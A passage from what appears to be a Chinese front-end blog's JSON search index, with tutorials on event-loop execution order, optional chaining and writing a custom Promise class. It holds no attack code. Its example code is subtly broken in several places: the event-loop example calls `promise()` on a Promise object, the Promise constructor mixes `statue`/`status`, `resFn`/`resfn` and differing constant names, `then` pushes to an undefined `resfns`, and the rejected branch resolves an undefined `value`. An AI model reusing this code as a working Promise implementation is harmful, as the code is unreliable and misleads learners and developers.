class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'3'</span>);</span><br><span class=\"line\">        <span class=\"built_in\">clearInterval</span>(intervalId);</span><br><span class=\"line\">    }, <span class=\"number\">0</span>);</span><br><span class=\"line\"><span class=\"comment\">// 1. 同步代码执行</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> promise = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'5'</span>);</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>(<span class=\"string\">'6'</span>);</span><br><span class=\"line\">});</span><br><span class=\"line\"><span class=\"comment\">// 2. 微任务执行</span></span><br><span class=\"line\"><span class=\"title function_\">promise</span>().<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res);</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"comment\">// 1. 同步代码执行</span></span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'4'</span>);</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<p><strong>结果</strong>：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">1</span><br><span class=\"line\">5</span><br><span class=\"line\">4</span><br><span class=\"line\">6</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td></tr></tbody></table></figure>\n\n<p>大家猜一下下面<strong>实例 3</strong> 的结果：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'1'</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> timeoutId = <span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'2'</span>);</span><br><span class=\"line\">    <span class=\"built_in\">clearTimeout</span>(timeoutId);</span><br><span class=\"line\">    (<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'8'</span>);</span><br><span class=\"line\">    })();</span><br><span class=\"line\">}, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">setTimeout</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'9'</span>);</span><br><span class=\"line\">}, <span class=\"number\">1000</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> promise = <span class=\"keyword\">new</span> <span class=\"title class_\">Promise</span>(<span class=\"function\">(<span class=\"params\">resolve</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'5'</span>);</span><br><span class=\"line\">    (<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'10'</span>);</span><br><span class=\"line\">    })();</span><br><span class=\"line\">    <span class=\"title function_\">resolve</span>(<span class=\"string\">'6'</span>);</span><br><span class=\"line\">});</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">const</span> intervalId = <span class=\"built_in\">setInterval</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'3'</span>);</span><br><span class=\"line\">    <span class=\"built_in\">clearInterval</span>(intervalId);</span><br><span class=\"line\">}, <span class=\"number\">0</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">promise.<span class=\"title function_\">then</span>(<span class=\"function\">(<span class=\"params\">res</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res);</span><br><span class=\"line\">    (<span class=\"function\">()=&gt;</span> {</span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'7'</span>);</span><br><span class=\"line\">    })();</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'4'</span>);</span><br></pre></td></tr></tbody></table></figure>","categories":["前端","javascript"],"tags":["前端","浏览器","Event Loop"]},{"title":"Optional chaining 语法编程","url":"//javascript/optional/chaining.html","content":"<h3 id=\"什么是-Optional-Chaining？\"><a href=\"#什么是-Optional-Chaining？\" class=\"headerlink\" title=\"什么是 Optional Chaining？\"></a>什么是 Optional Chaining？</h3><p>Optional chaining 是一个现代 JavaScript 语法特性，允许开发者在读取对象内部嵌套属性时安全地处理 <code>undefined</code> 或 <code>null</code> 值。这种语法通过 <code>?.</code> 操作符实现，可以避免在查询属性或调用方法时因为中间某个环节不存在而引发错误。</p>\n<h3 id=\"Optional-chaining-的基本使用示例如下\"><a href=\"#Optional-chaining-的基本使用示例如下\" class=\"headerlink\" title=\"Optional chaining 的基本使用示例如下\"></a>Optional chaining 的基本使用示例如下</h3><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> obj = {</span><br><span class=\"line\">    <span class=\"attr\">a</span>: {</span><br><span class=\"line\">        <span class=\"attr\">b</span>: {</span><br><span class=\"line\">            <span class=\"attr\">c</span>: <span class=\"number\">1</span></span><br><span class=\"line\">        }</span><br><span class=\"line\">    }</span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"comment\">// 传统的深层属性访问可能会抛出错误，如果某个属性不存在</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> value = obj &amp;&amp; obj.<span class=\"property\">a</span> &amp;&amp; obj.<span class=\"property\">a</span>.<span class=\"property\">b</span> &amp;&amp; obj.<span class=\"property\">a</span>.<span class=\"property\">b</span>.<span class=\"property\">c</span>;</span><br><span class=\"line\"><span class=\"comment\">// 使用 optional chaining 语法，安全地读取嵌套属性</span></span><br></pre></td></tr></tbody></table></figure>\n\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> valueWithOptionalChaining = obj?.<span class=\"property\">a</span>?.<span class=\"property\">b</span>?.<span class=\"property\">c</span>; <span class=\"comment\">// 输出 1</span></span><br><span class=\"line\"><span class=\"comment\">// 如果中间某个属性不存在，表达式会返回 undefined，而不是抛出错误</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> undefinedValue = obj?.<span class=\"property\">a</span>?.<span class=\"property\">nonExistingProp</span>?.<span class=\"property\">c</span>; <span class=\"comment\">// 输出 undefined</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"Optional-chaining-可以用于四种不同的操作\"><a href=\"#Optional-chaining-可以用于四种不同的操作\" class=\"headerlink\" title=\"Optional chaining 可以用于四种不同的操作\"></a>Optional chaining 可以用于四种不同的操作</h3><ol>\n<li>对象属性访问</li>\n</ol>\n<p>如上例所示，可以安全地访问嵌套对象属性。</p>\n<ol start=\"2\">\n<li>数组索引访问</li>\n</ol>\n<p>可以安全地访问数组的索引，如果数组是 undefined 或 null，则不会报错。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> arr = [<span class=\"number\">1</span>, <span class=\"number\">2</span>, <span class=\"number\">3</span>];</span><br><span class=\"line\"><span class=\"keyword\">const</span> valueAtIndex = arr?.[<span class=\"number\">2</span>]; <span class=\"comment\">// 输出 3</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> nonExistingIndex = arr?.[<span class=\"number\">5</span>]; <span class=\"comment\">// 输出 undefined</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>函数或方法调用</li>\n</ol>\n<p>如果不确定一个对象上的函数是否存在，可以使用 optional chaining 安全地调用函数或方法。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> obj = {</span><br><span class=\"line\"><span class=\"attr\">a</span>: <span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">'Function exists'</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br><span class=\"line\">obj.<span class=\"property\">a</span>?.(); <span class=\"comment\">// 输出 'Function exists'</span></span><br><span class=\"line\">obj.<span class=\"property\">b</span>?.(); <span class=\"comment\">// 由于 b 不存在，不执行任何操作，返回 undefined</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>默认值中使用 </li>\n</ol>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> user = {};</span><br><span class=\"line\"><span class=\"keyword\">const</span> name = user?.<span class=\"property\">name</span> ?? <span class=\"string\">\"匿名用户\"</span>;</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(name);</span><br></pre></td></tr></tbody></table></figure>\n\n<p>要注意的是，optional chaining 语法是 ECMAScript 2020（ES11）的一部分，因此在老旧的 JavaScript 环境中可能不受支持。对于这些环境，可以使用 Babel 这样的工具来转译代码，使其兼容。</p>\n","categories":["前端","es6"],"tags":["前端","JavaScript","es6"]},{"title":"编写 Promise 方法","url":"//javascript/promise.html","content":"<h5 id=\"Promise-是什么？\"><a href=\"#Promise-是什么？\" class=\"headerlink\" title=\"Promise 是什么？\"></a>Promise 是什么？</h5><p>Promise 是异步编程的一种解决方案，它是一个对象，可以获取异步 操作的消息，他的出现大大改善了异步编程的困境，避免了地狱回调， 它比传统的解决方案回调函数和事件更合理和更强大。</p>\n<span id=\"more\"></span>\n<p>所谓 Promise，简单说就是一个容器，里面保存着某个未来才会结束 的事件 (通常是一个异步操作) 的结果。从语法上说，Promise 是一 个对象，从它可以获取异步操作的消息。Promise 提供统一的 API， 各种异步操作都可以用同样的方法进行处理。</p>\n<ol>\n<li>Promise 的实例有三个状态:</li>\n</ol>\n<ul>\n<li><p>Pending (进行中)</p>\n</li>\n<li><p>Resolved (已完成)</p>\n</li>\n<li><p>Rejected (已拒绝)</p>\n</li>\n</ul>\n<p>当把一件事情交给 promise 时，它的状态就是 Pending，任务完成了 状态就变成了 Resolved、没有完成失败了就变成了 Rejected。</p>\n<ol start=\"2\">\n<li><p>Promise 的实例有两个过程:<br> pending -&gt; fulfilled: Resolved (已完成)<br> pending -&gt; rejected: Rejected (已拒绝)</p>\n<p> 注意：一旦从进行状态变成为其他状态就永远不能更改状态了。</p>\n</li>\n</ol>\n<h5 id=\"Promise-的特点\"><a href=\"#Promise-的特点\" class=\"headerlink\" title=\"Promise 的特点\"></a>Promise 的特点</h5><p>对象的状态不受外界影响。promise 对象代表一个异步操作，有三种 状态，pending (进行中)、fulfilled (已成功)、rejected (已失 败)。只有异步操作的结果，可以决定当前是哪一种状态，任何其他 操作都无法改变这个状态，这也是 promise 这个名字的由来 ——“承 诺”;</p>\n<p>一旦状态改变就不会再变，任何时候都可以得到这个结果。promise 对象的状态改变，只有两种可能：从 pending 变为 fulfilled，从 pending 变为 rejected。这时就称为 resolved (已定型)。如果改 变已经发生了，你再对 promise 对象添加回调函数，也会立即得到这 个结果。这与事件 (event) 完全不同，事件的特点是：如果你错过 了它，再去监听是得不到结果的。</p>\n<h5 id=\"Promise-实现\"><a href=\"#Promise-实现\" class=\"headerlink\" title=\"Promise 实现\"></a>Promise 实现</h5><p>Promise 实现是通过 js class 编写，主要包括 status、value、error、resolve、reject、then、catch、all、race、allSettled、any 等组成。</p>\n<ol>\n<li>状态 </li>\n</ol>\n<figure class=\"highlight ts\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span> = <span class=\"string\">\"pending\"</span>; <span class=\"comment\">// 进行中</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span> = <span class=\"string\">\"fulfilled\"</span>; <span class=\"comment\">// 已完成</span></span><br><span class=\"line\"><span class=\"keyword\">const</span> <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span> = <span class=\"string\">\"rejected\"</span>; <span class=\"comment\">// 已拒绝</span></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>resolve 创建一个已解决的 Promise 对象，将给定的值作为其参数。</li>\n</ol>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">resolve = <span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">      <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> !== <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span>;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">value</span> = value;</span><br><span class=\"line\">        <span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span>?.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">fn</span>) =&gt;</span> {</span><br><span class=\"line\">          <span class=\"title function_\">fn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">        });</span><br><span class=\"line\">      });</span><br><span class=\"line\">    }</span><br><span class=\"line\">  };</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>reject 创建一个已拒绝的 Promise 对象，将给定的原因作为其参数 </li>\n</ol>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">reject = <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">    <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> !== <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">error</span> = error;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">en</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"title function_\">en</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">error</span>);</span><br><span class=\"line\">      });</span><br><span class=\"line\">    });</span><br><span class=\"line\">  }</span><br><span class=\"line\">};</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>then 添加对 Promise 对象解决或拒绝时的处理程序</li>\n</ol>\n<ul>\n<li>单个方法调用 </li>\n</ul>\n   <figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">constructor</span>(<span class=\"params\">executer</span>) {</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">value</span> = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">error</span> = <span class=\"keyword\">void</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">resFn</span>;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">errFn</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">const</span> resolve = (<span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> === <span class=\"variable constant_\">PROMISE_STATUS_PENDING</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">status</span> = <span class=\"variable constant_\">PROMISE_STATUS_FULFILLED</span></span><br><span class=\"line\">      </span><br><span class=\"line\">      <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> { <span class=\"comment\">//queueMicrotask:  主线程执行完毕之后立马执行</span></span><br><span class=\"line\">          <span class=\"variable language_\">this</span>.<span class=\"title function_\">resfn</span>(value)</span><br><span class=\"line\">      })</span><br><span class=\"line\">    }</span><br><span class=\"line\">  })</span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">const</span> reject = (<span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">status</span> === <span class=\"variable constant_\">PROMISE_STATUS_PENDING</span>) {</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">status</span> = <span class=\"variable constant_\">PROMISE_STATUS_REJECTED</span></span><br><span class=\"line\">      <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">          <span class=\"variable language_\">this</span>.<span class=\"title function_\">errfn</span>(error)</span><br><span class=\"line\">      })</span><br><span class=\"line\">    }</span><br><span class=\"line\">  })</span><br><span class=\"line\">   <span class=\"title function_\">executer</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">resolve</span>, <span class=\"variable language_\">this</span>.<span class=\"property\">reject</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"title function_\">then</span>(<span class=\"params\">resFn, errFn</span>) {</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">resFn</span> = resFn;</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">errFn</span> = errFn;</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n<ul>\n<li>执行结果  <figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">const</span> p1 = <span class=\"keyword\">new</span> <span class=\"title function_\">myPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"title function_\">resolve</span>(<span class=\"number\">111</span>)</span><br><span class=\"line\">  <span class=\"title function_\">reject</span>(<span class=\"number\">333333</span>)</span><br><span class=\"line\">})</span><br><span class=\"line\">p1.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {        <span class=\"comment\">//最终打印 1111</span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(res);</span><br><span class=\"line\">}, <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(err);</span><br><span class=\"line\"></span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure></li>\n<li>优化 then 方法</li>\n</ul>\n<p>官方给与的 then 方法是可以进行数组传值和链式调用的，而目前我们写的是不支持。</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span> = [] <span class=\"comment\">//1.多次调用then 时用数组 保存</span></span><br><span class=\"line\"><span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span> = []</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 将then 方法修改为 </span></span><br><span class=\"line\"><span class=\"title function_\">then</span>(<span class=\"params\">resFn, errFn</span>) {</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">resfns</span>.<span class=\"title function_\">push</span>(resFn);</span><br><span class=\"line\">  <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span>.<span class=\"title function_\">push</span>(errFn);</span><br><span class=\"line\">}</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// resolve修改为</span></span><br><span class=\"line\">resolve = <span class=\"function\">(<span class=\"params\">value</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">    <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> !== <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">value</span> = value;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span>?.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">fn</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"title function_\">fn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">      });</span><br><span class=\"line\">    });</span><br><span class=\"line\">  }</span><br><span class=\"line\">};</span><br><span class=\"line\"><span class=\"comment\">// reject 修改为</span></span><br><span class=\"line\">reject = <span class=\"function\">(<span class=\"params\">error</span>) =&gt;</span> {</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">    <span class=\"title function_\">queueMicrotask</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> !== <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) <span class=\"keyword\">return</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> = <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span>;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">error</span> = error;</span><br><span class=\"line\">      <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span>.<span class=\"title function_\">forEach</span>(<span class=\"function\">(<span class=\"params\">en</span>) =&gt;</span> {</span><br><span class=\"line\">        <span class=\"title function_\">en</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">error</span>);</span><br><span class=\"line\">      });</span><br><span class=\"line\">    });</span><br><span class=\"line\">  }</span><br><span class=\"line\">};</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n<p>  优化后 then 的运行结果<br>  </p><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">p1.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {</span><br><span class=\"line\">  <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"res1:\"</span>, res) </span><br><span class=\"line\">}, <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"err1:\"</span>, err)</span><br><span class=\"line\">})</span><br><span class=\"line\"><span class=\"comment\">// 调用then方法多次调用</span></span><br><span class=\"line\">p1.<span class=\"title function_\">then</span>(<span class=\"function\"><span class=\"params\">res</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"res2:\"</span>, res)</span><br><span class=\"line\">}, <span class=\"function\"><span class=\"params\">err</span> =&gt;</span> {</span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"string\">\"err2:\"</span>, err)</span><br><span class=\"line\">})</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure><br>运行结果：res2: 111  因为后面的.then 把前面的覆盖掉了 并不会执行res1 所在的代码块<br>*由此可见 then 方法调用时应该是个数组然后依次调用<br>下面改造我们的代码then,还需要优化执行resolve 时调用reject<br>   <figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"title function_\">then</span>(<span class=\"params\">resFn, errFn</span>) {</span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"title function_\">defaultOnRejected</span> = (<span class=\"params\">err</span>) =&gt; {</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> err;</span><br><span class=\"line\">    };</span><br><span class=\"line\">    errFn = errFn || defaultOnRejected;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">const</span> <span class=\"title function_\">defaultOnFulFilled</span> = (<span class=\"params\">value</span>) =&gt; {</span><br><span class=\"line\">      <span class=\"keyword\">return</span> value;</span><br><span class=\"line\">    };</span><br><span class=\"line\">    resFn = resFn || defaultOnFulFilled;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyPromise</span>(<span class=\"function\">(<span class=\"params\">resolve, reject</span>) =&gt;</span> {</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_FULFILLED</span> &amp;&amp; !!resFn) {</span><br><span class=\"line\">        <span class=\"keyword\">try</span> {</span><br><span class=\"line\">          <span class=\"keyword\">const</span> value = <span class=\"title function_\">resFn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">          <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">        } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">          <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_REJECTED</span> &amp;&amp; !!errFn) {</span><br><span class=\"line\">        <span class=\"keyword\">try</span> {</span><br><span class=\"line\">          <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">        } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">          <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">      <span class=\"keyword\">if</span> (<span class=\"variable language_\">this</span>.<span class=\"property\">statue</span> === <span class=\"variable constant_\">PROMISE_STATUE_PENDING</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!!resFn) {</span><br><span class=\"line\">          <span class=\"variable language_\">this</span>.<span class=\"property\">resFns</span>.<span class=\"title function_\">push</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">            <span class=\"keyword\">try</span> {</span><br><span class=\"line\">              <span class=\"keyword\">const</span> value = <span class=\"title function_\">resFn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">value</span>);</span><br><span class=\"line\">              <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">            } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">              <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">            }</span><br><span class=\"line\">          });</span><br><span class=\"line\">        }</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!!errFn) {</span><br><span class=\"line\">          <span class=\"variable language_\">this</span>.<span class=\"property\">errFns</span>.<span class=\"title function_\">push</span>(<span class=\"function\">() =&gt;</span> {</span><br><span class=\"line\">            <span class=\"keyword\">try</span> {</span><br><span class=\"line\">              <span class=\"keyword\">const</span> value = <span class=\"title function_\">errFn</span>(<span class=\"variable language_\">this</span>.<span class=\"property\">error</span>);</span><br><span class=\"line\">              <span class=\"title function_\">resolve</span>(value);</span><br><span class=\"line\">            } <span class=\"keyword\">catch</span> (error) {</span><br><span class=\"line\">              <span class=\"title function_\">reject</span>(error);</span><br><span class=\"line\">            }</span><br><span class=\"line\">          });</span><br><span class=\"line\">        }</span><br><span class=\"line\">      }</span><br><span class=\"line\">    });</span><br><span class=\"line\">  }</span><br></pre></td></tr></tbody></table></figure><br>然后执行：<br>  <figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span 